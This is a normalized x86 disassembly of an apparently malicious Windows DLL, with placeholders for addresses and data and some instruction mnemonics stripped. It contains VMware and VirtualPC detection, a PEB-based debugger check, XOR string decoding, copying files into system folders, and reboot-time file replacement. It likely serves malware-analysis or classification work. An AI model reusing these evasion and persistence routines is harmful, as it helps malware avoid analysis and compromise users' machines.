[ edi ]
not ecx
sub edi ecx
push 0x3
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x18 ]
and ecx 0x3
mov ebx [ CreateFileA@IAT ]
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi edx
push 0x0
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push 0xc0000000
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x264 ]
push ecx
call ebx
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x340
retn
push ebp
lea edx [ esp + 0x50 ]
push 0x80
push edx
call [ GetSystemDirectoryA@IAT ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x50 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x150 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x150 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000c100
add esp 0x4
test eax eax
pop ebp
je r-xdata
xor eax eax
mov esi [ CopyFileA@IAT ]
lea ecx [ esp + 0x14c ]
push 0x0
lea edx [ esp + 0x50 ]
push ecx
push edx
call esi
mov ecx [ esp + 0x354 ]
lea eax [ esp + 0x4c ]
push 0x0
push eax
push ecx
call esi
lea edx [ esp + 0xc ]
push edx
call sub_1000c090
add esp 0x4
lea ecx [ esp + 0x14c ]
test eax eax
lea eax [ esp + 0x4c ]
push 0x0
push eax
push ecx
jne r-xdata
call esi
lea edx [ esp + 0x14c ]
push edx
call [ DeleteFileA@IAT ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
lea eax [ esp + 0x260 ]
push 0xc0000000
push eax
call ebx
cmp eax 0xffffffff
jne r-xdata
call esi
lea edx [ esp + 0x14c ]
push edx
call [ DeleteFileA@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x340
retn
lea ecx [ esp + 0xc ]
push ecx
call sub_1000c100
lea edx [ esp + 0x10 ]
push edx
call sub_1000c090
add esp 0x8
sub_1000c390
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
push esi
push eax
call [ CloseHandle@IAT ]
mov esi [ esp + 0xc ]
push esi
call sub_1000c010
add esp 0x4
test esi esi
je r-xdata
push rw-data
push esi
jmp r-xdata
call sub_1000c100
add esp 0x4
push rw-data
call sub_1000c090
add esp 0x4
pop esi
sub_1000c3d0
sub esp 0x30
push ebx
push esi
lea eax [ esp + 0x14 ]
push edi
push eax
call sub_1000c5d0
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x28 ]
mov esi [ GetCurrentThreadId@IAT ]
mov [ esp + 0x30 ] ecx
mov ecx [ esp + 0x24 ]
add esp 0x4
mov [ esp + 0x30 ] edx
mov [ esp + 0x38 ] eax
mov [ esp + 0x34 ] ecx
call esi
mov edi [ esp + 0x40 ]
lea edx [ esp + 0xc ]
mov ebx [ DeviceIoControl@IAT ]
push 0x0
push edx
mov [ esp + 0x30 ] eax
push 0x0
push 0x0
lea eax [ esp + 0x38 ]
push 0x14
push eax
push 0x22e660
push edi
call ebx
mov [ esp + 0x14 ] 0x1
call esi
lea ecx [ esp + 0xc ]
push 0x0
push ecx
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push 0x8
push edx
push 0x22e65c
push edi
mov [ esp + 0x30 ] eax
call ebx
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x30
retn
sub_1000c470
sub esp 0xc
mov [ esp + 0x8 ] 0x0
call [ GetCurrentThreadId@IAT ]
mov edx [ esp + 0x10 ]
mov [ esp + 0x4 ] eax
lea eax [ esp ]
push 0x0
push eax
push 0x0
push 0x0
lea ecx [ esp + 0x14 ]
push 0x8
push ecx
push 0x22e65c
push edx
call [ DeviceIoControl@IAT ]
xor eax eax
add esp 0xc
retn
sub_1000c4b0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push 0x0
push eax
push 0x0
push 0x0
push 0xc0
push ecx
push 0x22e24c
push edx
call [ DeviceIoControl@IAT ]
xor eax eax
retn
sub_1000c4e0
sub esp 0x20
push ebx
push ebp
mov ebp [ esp + 0x2c ]
push esi
push edi
push ebp
lea ecx [ esp + 0x24 ]
call sub_1000c710
lea ecx [ esp + 0x20 ]
call sub_1000c770
mov esi eax
push 0x5
lea ecx [ esp + 0x24 ]
mov [ esp + 0x1c ] esi
call sub_1000c780
mov edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ esp + 0x10 ] edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
test [ esi + 0x16 ] 0x1
jne r-xdata
add eax ebp
test edi edi
mov [ esp + 0x14 ] eax
je r-xdata
mov ecx [ eax + 0x4 ]
xor ebx ebx
mov [ esp + 0x1c ] ecx
lea edx [ eax + 0x8 ]
lea esi [ ecx - 0x8 ]
shr esi 0x1
test esi esi
jle r-xdata
sub edi ecx
add eax ecx
test edi edi
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] eax
jne r-xdata
mov edi [ eax ]
inc ebx
add edx 0x2
cmp ebx esi
jl r-xdata
mov ecx [ eax + ebp ]
mov ebp [ esp + 0x18 ]
sub ecx [ ebp + 0x34 ]
mov ebp [ esp + 0x38 ]
cmp ecx ebp
mov ebp [ esp + 0x34 ]
jne r-xdata
mov cx [ edx ]
mov eax ecx
and ecx 0xf000
and eax 0xfff
add eax edi
cmp ecx 0x3000
jne r-xdata
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x10 ]
cmp [ eax + ebp - 0x2 ] 0x5c7
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ eax + ebp + 0x4 ]
pop edi
pop esi
mov ecx [ edx + 0x34 ]
pop ebp
sub eax ecx
pop ebx
add esp 0x20
retn
sub_1000c5d0
sub esp 0x18
push ebx
lea eax [ esp + 0x8 ]
push esi
push eax
lea ecx [ esp + 0xc ]
push 0x4
push ecx
push 0xb
mov [ esp + 0x18 ] 0x0
call sub_1000c7c0
cmp eax 0xc0000004
jne r-xdata
pop esi
xor eax eax
pop ebx
add esp 0x18
retn
mov edx [ esp + 0xc ]
push edx
call sub_1001462e
mov ecx [ esp + 0x10 ]
add esp 0x4
mov [ esp + 0x8 ] eax
push 0x0
push ecx
push eax
push 0xb
call sub_1000c7c0
test eax eax
jl r-xdata
mov edx [ esp + 0x8 ]
push edx
call sub_10014657
add esp 0x4
mov eax [ esp + 0x8 ]
xor ecx ecx
push 0x1
push 0x0
mov cx [ eax + 0x1e ]
lea eax [ ecx + eax + 0x20 ]
push eax
call [ LoadLibraryExA@IAT ]
mov esi eax
test esi esi
je r-xdata
push rw-data
push esi
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
sub eax esi
push eax
push esi
call sub_1000c4e0
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
mov eax [ esp + 0x8 ]
push eax
call sub_10014657
add esp 0x4
xor eax eax
pop esi
pop ebx
add esp 0x18
retn
push edi
push esi
lea ecx [ esp + 0x18 ]
call sub_1000c710
lea ecx [ esp + 0x14 ]
call sub_1000c770
mov edi [ eax + 0x34 ]
lea ecx [ esp + 0x14 ]
call sub_1000c770
mov eax [ eax + 0x50 ]
add esi ebx
mov ecx esi
xor edx edx
mov ebx [ ecx ]
sub ebx edi
cmp ebx eax
jae r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call sub_10014657
add esp 0x4
xor eax eax
pop esi
pop ebx
add esp 0x18
retn
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0xc ]
mov [ eax + 0x8 ] esi
mov [ eax ] edi
mov ecx [ ecx + 0xc ]
pop edi
mov [ eax + 0x4 ] ecx
mov [ eax + 0xc ] edx
pop esi
xor eax eax
pop ebx
add esp 0x18
retn
mov ebx [ ecx + 0x4 ]
add ecx 0x4
sub ebx edi
inc edx
cmp ebx eax
jb r-xdata
sub_1000c710
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
cmp [ ecx ] 0x5a4d
je r-xdata
mov edx [ ecx + 0x3c ]
add ecx edx
mov [ eax + 0x8 ] ecx
cmp [ ecx ] 0x4550
je r-xdata
lea eax [ esp + 0x4 ]
push r--data
push eax
mov [ esp + 0xc ] 0x57
call sub_10004998
add ecx 0xf8
mov [ eax + 0xc ] ecx
retn 0x4
lea eax [ esp + 0x4 ]
push r--data
push eax
mov [ esp + 0xc ] 0x57
call sub_10004998
sub_1000c790
push rw-data
call [ GetModuleHandleA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
retn
push rw-data
call [ LoadLibraryA@IAT ]
test eax eax
jne r-xdata
retn
sub_1000c7c0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
mov ecx [ esp + 0xc ]
push edx
mov edx [ esp + 0xc ]
push ecx
push edx
call eax
retn 0x10
push rw-data
call sub_1000c790
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
retn 0x10
sub_1000c800
sub esp 0x1ac
push esi
push edi
mov [ esp + 0x8 ] rw-data
mov [ esp + 0xc ] rw-data
mov [ esp + 0x10 ] rw-data
mov [ esp + 0x14 ] rw-data
mov [ esp + 0x18 ] rw-data
mov [ esp + 0x1c ] rw-data
mov [ esp + 0x20 ] rw-data
xor esi esi
lea edi [ esp + 0x8 ]
pop edi
mov eax 0x1
pop esi
add esp 0x1ac
retn
inc esi
add edi 0x4
cmp esi 0x7
jb r-xdata
mov ecx [ edi ]
lea eax [ esp + 0x24 ]
push 0x0
push eax
push ecx
call sub_10012da0
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x1ac
retn
sub_1000c880
mov edx [ esp + 0x4 ]
sub esp 0x28
test edx edx
je r-xdata
xor eax eax
add esp 0x28
retn
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
pop edi
je r-xdata
push rw-data
push edx
call sub_1000409a
add esp 0x8
test eax eax
je r-xdata
lea ecx [ esp ]
push 0x0
push ecx
push eax
call sub_10012da0
add esp 0xc
test eax eax
jne r-xdata
mov eax 0x1
add esp 0x28
retn
push rw-data
push eax
call sub_1000409a
add esp 0x8
test eax eax
jne r-xdata
sub_1000c8f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
push eax
mov eax [ fs : 0x30 ]
movzx eax [ eax + 0x68 ]
and eax 0x70
test eax eax
je r-xdata
pop eax
mov ecx [ ebp - 0x4 ]
xor eax eax
test ecx ecx
setne al
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x1
sub_1000c950
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
push ebx
mov ebx 0x0
mov eax 0x1
sub_1000c98a
aas
pop es
or eax [ ebp + 0x45940fdb ]
in al 0x5b
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000c9e0
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0x0
push edx
push ecx
push ebx
mov eax 0x564d5868
mov ebx 0x0
mov ecx 0xa
mov edx 0x5658
in eax dx
cmp ebx 0x564d5868
sete [ ebp - 0x1c ]
pop ebx
pop ecx
pop edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000ca80
sub esp 0x700
push ebp
push edi
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x9 ]
mov [ esp + 0x8 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x89 ]
mov [ esp + 0x88 ] 0x0
[ edi ]
stosw [ edi ]
push 0x60e
stosb [ edi ]
call sub_100049d2
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
mov ecx 0x183
xor eax eax
mov edi ebp
[ edi ]
stosw [ edi ]
mov eax [ esp + 0x710 ]
test eax eax
je r-xdata
pop edi
pop ebp
add esp 0x700
retn
mov eax [ esp + 0x714 ]
test eax eax
je r-xdata
push esi
push eax
lea eax [ esp + 0x210 ]
push eax
call sub_1000cfd0
mov eax [ esp + 0x718 ]
add esp 0x8
test eax eax
je r-xdata
mov eax ebp
pop edi
pop ebp
add esp 0x700
retn
push 0x400
lea ecx [ esp + 0x20c ]
push eax
push ecx
call sub_1000d080
lea edx [ esp + 0x270 ]
lea eax [ ebp + 0x26c ]
push edx
push eax
call sub_1000cf80
lea ecx [ esp + 0x318 ]
lea edx [ ebp + 0x30c ]
push ecx
push edx
call sub_1000cf80
mov ax [ esp + 0x460 ]
lea ecx [ esp + 0x224 ]
lea edx [ ebp + 0x210 ]
push ecx
push edx
mov [ ebp + 0x44c ] ax
call sub_1000cf80
lea eax [ esp + 0x234 ]
lea ecx [ ebp + 0x218 ]
push eax
push ecx
call sub_1000cf80
lea edx [ esp + 0x240 ]
lea eax [ ebp + 0x21c ]
push edx
push eax
call sub_1000cf80
lea ecx [ esp + 0x288 ]
lea edx [ ebp + 0x25c ]
push ecx
push edx
call sub_1000cf80
lea eax [ esp + 0x298 ]
lea ecx [ ebp + 0x264 ]
push eax
push ecx
call sub_1000cf80
add esp 0x44
lea edx [ esp + 0x446 ]
lea eax [ ebp + 0x44e ]
push edx
push eax
call sub_1000cf80
lea ecx [ esp + 0x48e ]
lea edx [ ebp + 0x48e ]
push ecx
push edx
call sub_1000cf80
lea eax [ esp + 0x4d6 ]
lea ecx [ ebp + 0x4ce ]
push eax
push ecx
call sub_1000cf80
lea edx [ esp + 0x4fe ]
lea eax [ ebp + 0x4ee ]
push edx
push eax
call sub_1000cf80
lea ecx [ esp + 0x546 ]
lea edx [ ebp + 0x52e ]
push ecx
push edx
call sub_1000cf80
lea eax [ esp + 0x58e ]
lea ecx [ ebp + 0x56e ]
push eax
push ecx
call sub_1000cf80
lea edx [ esp + 0x5b6 ]
lea eax [ ebp + 0x58e ]
push edx
push eax
call sub_1000cf80
lea ecx [ esp + 0x5fe ]
lea edx [ ebp + 0x5ce ]
push ecx
push edx
call sub_1000cf80
add esp 0x40
push 0x0
lea eax [ esp + 0x610 ]
push 0x1a
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
lea ecx [ esp + 0x20c ]
push rw-data
push ecx
call sub_1000409a
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x94 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x94 ]
push ecx
push ebp
call sub_1000cf80
lea edx [ ebp + 0x20 ]
push r--data
push edx
call sub_1000cf80
push rw-data
push 0x0
call sub_1000409a
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x12c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x62c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0x2c ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x12c ]
push ecx
push edx
push rw-data
push eax
call sub_1000401e
lea ecx [ esp + 0x3c ]
lea edx [ ebp + 0x40 ]
push ecx
push edx
call sub_1000cf80
lea eax [ ebp + 0xc0 ]
push r--data
push eax
call sub_1000cf80
add esp 0x40
lea ecx [ esp + 0x8c ]
lea edx [ esp + 0xc ]
lea eax [ esp + 0x20c ]
push ecx
push edx
push rw-data
push eax
call sub_1000401e
lea ecx [ esp + 0x21c ]
lea edx [ ebp + 0x140 ]
push ecx
push edx
call sub_1000cf80
add esp 0x18
lea ecx [ esp + 0x60c ]
push 0x100
push ecx
call [ GetSystemDirectoryA@IAT ]
lea edx [ esp + 0x20c ]
push rw-data
push edx
call sub_1000409a
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x94 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x94 ]
push ecx
push ebp
call sub_1000cf80
push rw-data
push 0x0
call sub_1000409a
mov edx [ esp + 0x734 ]
lea eax [ esp + 0x124 ]
push edx
push eax
call sub_1000cfd0
lea ecx [ esp + 0x12c ]
lea edx [ ebp + 0x20 ]
push ecx
push edx
call sub_1000cf80
push rw-data
push 0x0
call sub_1000409a
mov edi eax
or ecx 0xffffffff
xor eax eax
add esp 0x30
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x10c ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ esp + 0x10c ] 0x5c
jne r-xdata
lea edi [ esp + 0x60c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10c ]
lea edx [ esp + 0x60c ]
push ecx
push edx
lea eax [ esp + 0x14 ]
push rw-data
push eax
call sub_1000401e
add esp 0x10
jmp r-xdata
mov ecx 0x10
xor eax eax
lea edi [ ebp + 0x1c0 ]
push rw-data
[ edi ]
lea eax [ ebp + 0x200 ]
push eax
call sub_1000cf80
add esp 0x8
pop esi
lea ecx [ esp + 0xc ]
lea edx [ ebp + 0x40 ]
push ecx
push edx
call sub_1000cf80
push rw-data
push 0x0
call sub_1000409a
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x11c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp + 0xc0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x11c ]
push ecx
push edx
call sub_1000cf80
push rw-data
push 0x0
call sub_1000409a
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x12c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp + 0x140 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x12c ]
push ecx
push edx
call sub_1000cf80
add esp 0x28
jmp r-xdata
sub_1000cf80
mov edx [ esp + 0x8 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
mov ecx [ esp + 0x8 ]
pop edi
mov [ eax + ecx ] 0x0
retn
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi ebx
sub esi edx
mov edi ecx
mov [ esi + edx ] al
inc edx
dec edi
jne r-xdata
xor al 0x55
mov al [ edx ]
cmp al 0x55
je r-xdata
mov [ ecx + ebx ] 0x0
pop esi
pop ebx
pop edi
retn
sub_1000cfd0
sub esp 0x84
mov edx [ esp + 0x8c ]
push ebx
push ebp
push esi
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov [ esp + 0x10 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea ebx [ esp + 0x14 ]
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
xor edi edi
test ebp ebp
jle r-xdata
mov edx [ esp + 0x98 ]
mov [ edi + edx ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
mov ebx [ esp + 0x98 ]
mov esi edx
sub ebx edx
mov [ ebx + esi ] cl
inc edi
inc esi
cmp edi ebp
jl r-xdata
xor cl dl
mov eax edi
mov cl [ esi ]
cdq
idiv [ esp + 0x10 ]
mov dl [ esp + edx + 0x14 ]
cmp cl dl
je r-xdata
mov ecx [ esp + 0x98 ]
mov [ edi + ecx ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
sub_1000d080
sub esp 0x80
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push ebx
push esi
push edi
mov edi rw-data
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebx ecx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x98 ]
xor ecx ecx
test edi edi
jle r-xdata
pop edi
pop esi
pop ebx
add esp 0x80
retn
mov eax [ esp + 0x90 ]
push ebp
mov ebp [ esp + 0x98 ]
sub ebp eax
mov edx [ esp + 0x94 ]
mov eax ecx
lea esi [ ecx + edx ]
cdq
idiv ebx
mov al [ esp + edx + 0x10 ]
mov dl [ esi + ebp ]
xor al dl
inc ecx
cmp ecx edi
mov [ esi ] al
jl r-xdata
pop ebp
sub_1000d110
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
push esi
add ecx 0x2
mov esi 0x4
mov dl [ eax ]
add eax 0x4
mov [ ecx - 0x2 ] dl
mov edx [ eax - 0x4 ]
shr edx 0x8
mov [ ecx - 0x1 ] dl
mov edx [ eax - 0x4 ]
shr edx 0x10
mov [ ecx ] dl
mov edx [ eax - 0x4 ]
shr edx 0x18
mov [ ecx + 0x1 ] dl
add ecx 0x4
dec esi
jne r-xdata
pop esi
retn
sub_1000d150
mov eax [ esp + 0x4 ]
sub esp 0x418
push ebx
push ebp
push esi
mov esi [ esp + 0x430 ]
xor ebx ebx
push edi
push ebx
push esi
push eax
call [ CopyFileA@IAT ]
push rw-data
push esi
call sub_1000426d
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov ebp [ esp + 0x430 ]
lea edx [ esp + 0x10 ]
lea ecx [ ebp + 0x4 ]
push ecx
push edx
call sub_1000d110
push 0x0
push 0x0
push esi
call sub_10011c70
push esi
push 0x400
lea eax [ esp + 0x40 ]
push 0x1
push eax
call sub_10011b59
add esp 0x24
cmp eax 0x400
jne r-xdata
pop edi
pop esi
pop ebp
or ax 0xffff
pop ebx
add esp 0x418
retn
push esi
call sub_100041bf
add esp 0x4
or ax 0xffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x418
retn
xor edi edi
cmp edi 0x3f0
jl r-xdata
inc edi
cmp edi 0x3f0
jl r-xdata
lea ecx [ edi + ebx + 0x10 ]
push 0x0
push ecx
push esi
call sub_10011c70
push esi
push 0x400
add ebp 0x14
push 0x1
push ebp
call sub_10011a20
push esi
call sub_100041bf
add esp 0x20
xor ax ax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x418
retn
add ebx 0x3f0
push 0x0
push ebx
push esi
call sub_10011c70
push esi
push 0x400
lea eax [ esp + 0x38 ]
push 0x1
push eax
call sub_10011b59
add esp 0x1c
cmp eax 0x400
je r-xdata
lea ecx [ esp + 0x10 ]
push 0x10
lea edx [ esp + edi + 0x28 ]
push ecx
push edx
call sub_1000ab60
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
sub_1000d280
mov edx [ esp + 0x4 ]
sub esp 0x100
or ecx 0xffffffff
xor eax eax
push ebx
push ebp
push esi
push edi
mov edi edx
lea ebx [ esp + 0x90 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi ebx
lea ebx [ esp + 0x90 ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea ebx [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ esp + 0x120 ]
lea edx [ esp + 0x94 ]
push ecx
push edx
call sub_1000d150
add esp 0xc
test ax ax
jge r-xdata
mov esi [ esp + 0x118 ]
push rw-data
push esi
call sub_1000d580
push esi
lea eax [ esp + 0x1c ]
push rw-data
push eax
call sub_1000d3c0
add esp 0x14
lea ecx [ esp + 0x10 ]
push ecx
call [ DeleteFileA@IAT ]
push 0x4
lea edx [ esp + 0x94 ]
push 0x0
push edx
call [ MoveFileExA@IAT ]
pop edi
pop esi
pop ebp
xor ax ax
pop ebx
add esp 0x100
retn
pop edi
pop esi
pop ebp
or ax 0xffff
pop ebx
add esp 0x100
retn
sub_1000d3c0
sub esp 0x104
mov eax [ esp + 0x108 ]
push ebx
push ebp
push esi
push edi
push rw-data
push eax
mov [ esp + 0x18 ] 0x0
call sub_1000426d
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x104
retn
push 0x2
push 0x0
push esi
call sub_10011c70
push esi
call sub_10011d29
mov ebx eax
lea ecx [ ebx + 0x1 ]
push ecx
call sub_100049d2
mov edi eax
add esp 0x14
test edi edi
jne r-xdata
cmp ebx 0x2710
lea eax [ ebx + ebx ]
jl r-xdata
push esi
call sub_100041bf
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
mov [ esp + 0x10 ] eax
inc eax
push eax
call sub_100049d2
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
mov eax ebx
push 0x0
push 0x0
push esi
call sub_10011c70
push esi
push ebx
push 0x1
push edi
call sub_1000e970
add esp 0x1c
cmp eax ebx
jne r-xdata
push esi
call sub_100041bf
push edi
call sub_1000413e
add esp 0x8
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
push esi
call sub_100041bf
push edi
call sub_1000413e
push ebp
call sub_1000413e
add esp 0xc
push eax
lea edx [ esp + 0x14 ]
push edi
push edx
push ebp
call sub_10011260
add esp 0x10
test eax eax
jl r-xdata
mov eax [ esp + 0x10 ]
push eax
push ebp
push edi
call sub_1000d080
push esi
call sub_100041bf
mov ecx [ esp + 0x130 ]
push rw-data
push ecx
call sub_1000426d
mov ebx eax
add esp 0x18
test ebx ebx
jne r-xdata
mov edx [ esp + 0x11c ]
lea eax [ esp + 0x14 ]
push edx
push eax
call sub_1000cfd0
push ebx
push 0x4
lea ecx [ esp + 0x24 ]
push 0x1
push ecx
call sub_10011a20
mov eax [ esp + 0x28 ]
lea edx [ esp + 0xac ]
push 0xa
push edx
push eax
call sub_1000b297
lea ecx [ esp + 0xb8 ]
lea edx [ esp + 0x38 ]
push ecx
push edx
call sub_1000cfd0
push ebx
push 0xc
lea eax [ esp + 0x48 ]
push 0x1
push eax
call sub_10011a20
push ebx
call sub_10007829
mov ecx [ esp + 0x50 ]
add esp 0x40
push esi
push ecx
push 0x1
push edi
call sub_1000e910
push ebx
call sub_100041bf
push edi
call sub_1000413e
push ebp
call sub_1000413e
add esp 0x1c
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
